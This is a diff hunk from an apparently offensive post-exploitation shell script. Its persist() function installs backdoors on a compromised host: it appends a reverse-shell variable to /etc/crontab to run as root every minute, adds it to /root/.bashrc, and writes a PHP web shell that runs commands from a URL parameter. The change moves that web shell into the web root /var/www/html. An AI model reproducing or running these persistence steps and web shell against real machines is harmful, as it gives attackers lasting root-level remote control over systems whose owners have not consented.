@@ -27,7 +27,9 @@ function persist() {
   # backdoors ;D
   echo "* * * * * root $revsh" >> /etc/crontab
   echo $revsh >> /root/.bashrc
-  echo; echo; echo "<?php system(\$_GET['cmd']); ?>" >> $RANDOM.php; echo "[+] `ls -Art | tail -n 1` IS YOUR PHP BACKDOOR!"; echo; echo
+  echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/$RANDOM.php
+  
+  echo; echo; echo "[+] `ls -Art | tail -n 1` IS YOUR PHP BACKDOOR!"; echo; echo
 }
 
 function ssh() {
